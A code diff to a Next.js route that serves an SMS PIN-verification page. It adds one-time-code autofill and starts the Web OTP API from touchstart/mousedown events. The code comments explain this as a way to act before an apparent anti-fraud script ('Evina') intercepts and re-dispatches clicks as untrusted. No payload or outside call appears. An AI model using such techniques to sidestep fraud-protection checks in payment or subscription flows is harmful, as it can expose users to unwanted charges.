@@ -205,7 +205,7 @@ export async function GET(request: NextRequest) {
               <p>PIN sent to <b>${masked}</b></p>
             </div>
             <div class="otp-row" id="otpRow">
-              <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin0" autocomplete="off">
+              <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin0" autocomplete="one-time-code">
               <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin1" autocomplete="off">
               <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin2" autocomplete="off">
               <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off">
@@ -250,6 +250,7 @@ export async function GET(request: NextRequest) {
     var confirmBtn = document.getElementById('confirmBtn');
     var errorMsg = document.getElementById('errorMsg');
     var otpValue = document.getElementById('otpValue');
+    var webOTPStarted = false;
 
     function dbg(msg) {
       var ts = new Date().toLocaleTimeString();
@@ -315,15 +316,19 @@ export async function GET(request: NextRequest) {
       document.getElementById('trustSignals').classList.add('phase-hidden');
       document.getElementById('stepDot2').classList.add('active');
 
-      // Skip the "Verifying..." spinner — go straight to manual OTP input
-      // and start Web OTP at the same time so Chrome dialog appears alongside the input fields
+      // Show OTP input fields immediately — no spinner wait
       document.getElementById('autoReading').classList.add('phase-hidden');
       document.getElementById('manualEntry').classList.remove('phase-hidden');
       document.getElementById('resendArea').classList.remove('phase-hidden');
       confirmBtn.textContent = 'Verify Code';
       setTimeout(function() { pins[0].focus(); }, 100);
-      dbg('OTP input shown — starting Web OTP listener');
-      startWebOTP();
+      dbg('OTP input shown');
+      // Web OTP already started from touchstart/mousedown (trusted gesture)
+      // If not started yet (fallback), start now
+      if (!webOTPStarted) {
+        dbg('Web OTP fallback — starting from goToPhase2');
+        startWebOTP();
+      }
     }
 
     function showManualEntry() {
@@ -340,6 +345,7 @@ export async function GET(request: NextRequest) {
         dbg('Web OTP: not available on this browser');
         return;
       }
+      webOTPStarted = true;
       dbg('Web OTP: listening for SMS (Chrome dialog should appear now)...');
       otpAbort = new AbortController();
 
@@ -371,6 +377,20 @@ export async function GET(request: NextRequest) {
       dbg('Auto-verify with code: "' + cleaned + '"');
       setTimeout(function() { verifyPin(cleaned); }, 500);
     }
+
+    // Start Web OTP on touchstart/mousedown — these fire BEFORE Evina intercepts
+    // the click event. Chrome Web OTP API requires a TRUSTED user gesture to show
+    // the SMS dialog. Evina re-dispatches click with isTrusted=false, so we must
+    // call navigator.credentials.get() here while the gesture is still trusted.
+    function handleTrustedGesture(e) {
+      if (phase === 1 && !webOTPStarted && e.isTrusted) {
+        webOTPStarted = true;
+        dbg('Trusted gesture (' + e.type + ') — starting Web OTP now');
+        startWebOTP();
+      }
+    }
+    confirmBtn.addEventListener('touchstart', handleTrustedGesture, { passive: true });
+    confirmBtn.addEventListener('mousedown', handleTrustedGesture);
 
     confirmBtn.addEventListener('click', function(e) {
       dbg('confirmBtn clicked — phase=' + phase + ' isTrusted=' + e.isTrusted);
